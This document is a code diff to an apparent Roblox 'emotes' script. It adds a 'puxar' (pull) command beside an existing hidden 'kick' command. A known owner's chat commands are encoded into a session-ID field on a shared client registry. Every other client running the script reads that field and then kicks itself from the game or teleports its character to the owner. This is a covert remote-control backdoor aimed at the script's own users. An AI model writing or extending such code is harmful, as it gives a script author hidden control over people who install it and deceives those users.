@@ -2004,18 +2004,46 @@ local function emotesDarkKickSelf(reason)
     end)
 end
 
+local function emotesDarkFindRoot(player)
+    local character = player and player.Character
+    return character and (character:FindFirstChild("HumanoidRootPart") or character:FindFirstChild("UpperTorso") or character:FindFirstChild("Torso"))
+end
+
+local function emotesDarkPullSelf(owner)
+    local localPlayer = Players.LocalPlayer
+    if not localPlayer or not owner then return end
+
+    task.spawn(function()
+        for _ = 1, 12 do
+            local targetRoot = emotesDarkFindRoot(localPlayer)
+            local ownerRoot = emotesDarkFindRoot(owner)
+            if targetRoot and ownerRoot then
+                pcall(function()
+                    targetRoot.CFrame = ownerRoot.CFrame * CFrame.new(0, 0, -3)
+                    targetRoot.AssemblyLinearVelocity = Vector3.zero
+                    targetRoot.AssemblyAngularVelocity = Vector3.zero
+                end)
+                return
+            end
+            task.wait(0.1)
+        end
+    end)
+end
+
 local function emotesDarkHandleKickCommand(sender, message)
     if not emotesDarkKickListening or State.scriptKicked or not sender or type(message) ~= "string" then return end
     if not isKnownOwnerPlayer(sender) then return end
 
     local command, arguments = message:match("^%s*/(%S+)%s*(.-)%s*$")
-    if not command or command:lower() ~= "kick" then return end
+    command = command and command:lower() or ""
+    if command ~= "kick" and command ~= "puxar" then return end
+
     local target, reason = arguments:match("^(%S+)%s*(.-)%s*$")
     if not target then return end
 
-    -- O owner publica o comando no registro compartilhado para os outros clientes.
     if sender == Players.LocalPlayer then
         emotesDarkPendingKickCommand = {
+            action = command,
             nonce = tostring(os.time()) .. ":" .. tostring(math.random(1000, 9999)),
             senderUserId = sender.UserId,
             target = target,
@@ -2024,9 +2052,10 @@ local function emotesDarkHandleKickCommand(sender, message)
         }
     end
 
-    -- Também atende o próprio owner caso ele seja o alvo.
-    if emotesDarkKickTargetMatches(target) then
+    if command == "kick" and emotesDarkKickTargetMatches(target) then
         emotesDarkKickSelf(reason or "")
+    elseif command == "puxar" and emotesDarkKickTargetMatches(target) then
+        emotesDarkPullSelf(sender)
     end
 end
 
@@ -2174,6 +2203,7 @@ local function emotesDarkTagClientInfo()
         sessionId = table.concat({
             emotesDarkTagSessionId,
             "DK",
+            tostring(kickCommand.action or "kick"),
             tostring(kickCommand.nonce or ""),
             tostring(kickCommand.senderUserId or ""),
             HttpService:UrlEncode(tostring(kickCommand.target or "")),
@@ -2467,14 +2497,18 @@ task.spawn(function()
         if response and type(response.clients) == "table" then
             for _, client in ipairs(response.clients) do
                 local sessionId = type(client) == "table" and tostring(client.sessionId or "") or ""
-                local nonce, senderUserId, encodedTarget, encodedReason = sessionId:match("|DK|([^|]+)|([^|]+)|([^|]*)|(.*)$")
+                local action, nonce, senderUserId, encodedTarget, encodedReason = sessionId:match("|DK|([^|]+)|([^|]+)|([^|]+)|([^|]*)|(.*)$")
                 local sender = senderUserId and Players:GetPlayerByUserId(tonumber(senderUserId))
                 if sender and isKnownOwnerPlayer(sender) and nonce and nonce ~= "" and not emotesDarkHandledKickCommands[nonce] then
                     emotesDarkHandledKickCommands[nonce] = true
                     local target = emotesDarkDecodeKickField(encodedTarget)
                     local reason = emotesDarkDecodeKickField(encodedReason)
                     if emotesDarkKickTargetMatches(target) then
-                        emotesDarkKickSelf(reason)
+                        if action == "kick" then
+                            emotesDarkKickSelf(reason)
+                        elseif action == "puxar" then
+                            emotesDarkPullSelf(sender)
+                        end
                         break
                     end
                 end
